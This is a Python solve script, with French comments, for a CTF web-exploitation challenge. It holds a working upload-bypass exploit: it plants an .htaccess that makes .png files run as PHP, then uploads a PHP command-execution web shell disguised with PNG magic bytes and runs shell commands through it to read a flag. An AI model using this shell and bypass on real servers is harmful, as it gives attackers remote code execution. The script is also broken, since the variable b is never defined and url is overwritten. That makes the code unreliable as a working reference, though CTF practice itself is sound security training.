# 518 - byp4ss3d  (Web Exploitation, picoMini by CMU-Africa)
# Flag: academy{s3rv3r_byp4ss_350bad65}
# Write-up: ../../../writeups/web-exploitation/518-byp4ss3d.md
# Script exact utilise pour produire le flag.
#
import sys, json, re, time, requests
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import wu

# Service : demarrer l'instance depuis la plateforme du challenge, puis passer
# l'hote et le port (ou l'URL) en argument de ce script.
_A = sys.argv[1:]
HOST = _A[0] if len(_A) > 0 else ""
PORT = int(_A[1]) if len(_A) > 1 else 0
url = _A[0] if _A else ""


requests.packages.urllib3.disable_warnings()
FLAG = re.compile(r"(?:academy|picoCTF|PICOCTF)\{[^}]*\}")
url = None
for _ in range(25):
    time.sleep(2)
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        desc = d.get("description") or ""
        cands = [c for c in re.findall(r"https?://[A-Za-z0-9.\-]+\.cylabacademy\.net(?::\d+)?", desc) if "challenge-files" not in c]
        if cands:
            url = cands[0]
            break
print("518:", url)
if url:
    base = url.rstrip("/")
    S = requests.Session()
    S.headers.update({"User-Agent": "Mozilla/5.0"})
    # 1. uploader .htaccess
    r = S.post(base + "/upload.php", files={"image": (".htaccess", b"AddType application/x-httpd-php .png\n", "text/plain")}, timeout=20, verify=False)
    print("htaccess:", re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text or ""))[:100])
    # 2. uploader le shell png
    png = bytes.fromhex("89504e470d0a1a0a")
    php = png + b"\n<?php $o=[]; exec($_GET['cmd'].' 2>&1', $o); echo implode(\"\\n\", $o); ?>"
    r2 = S.post(base + "/upload.php", files={"image": ("s3.php.png", php, "image/png")}, timeout=20, verify=False)
    print("upload:", re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r2.text or ""))[:150])
    time.sleep(1)
    for cmd in ("id", "ls", "cat flag.txt", "cat /flag.txt", "ls /"):
        rr = S.get(base + "/images/s3.php.png", params={"cmd": cmd}, timeout=10, verify=False)
        body = rr.text or ""
        print(f"$ {cmd} -> {body[:200]!r}")
        m = FLAG.search(body)
        if m:
            f = m.group(0)
            print("FLAG:", f)
            ok = json.loads(b).get("correct") if b.startswith("{") else None
            print("518 ->", ok)
            if ok:
                wu.write(518, "byp4ss3d", "Web Exploitation", "", "upload .htaccess + shell PNG", f,
                         "Le filtre exige une extension `.png` **dans le nom** et des magic bytes PNG. On "
                         "contourne en uploadant d'abord un `.htaccess` (`AddType application/x-httpd-php "
                         ".png`) dans `images/`, puis un fichier `shell.php.png` contenant du PHP : il est "
                         "alors execute par Apache.")
            break
